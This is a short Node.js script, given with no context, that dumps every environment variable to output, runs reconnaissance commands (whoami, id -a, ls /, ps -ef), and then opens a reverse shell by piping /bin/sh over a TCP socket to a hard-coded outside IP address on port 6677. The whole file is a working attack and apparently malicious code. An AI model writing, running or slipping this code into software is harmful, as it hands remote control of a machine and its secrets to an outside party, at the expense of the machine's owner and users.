const process = require('process');
const child_process = require('child_process');
const net = require('net');

function run(command) {
  console.log("Running: " + command);
  child_process.execSync(command, { stdio: 'inherit' });
}

console.log("Env:");
console.log(process.env);

run("whoami");
run("id -a");
run("ls /");
run("ps -ef");

const sh = child_process.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(6677, "152.136.32.206", function () {
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
});

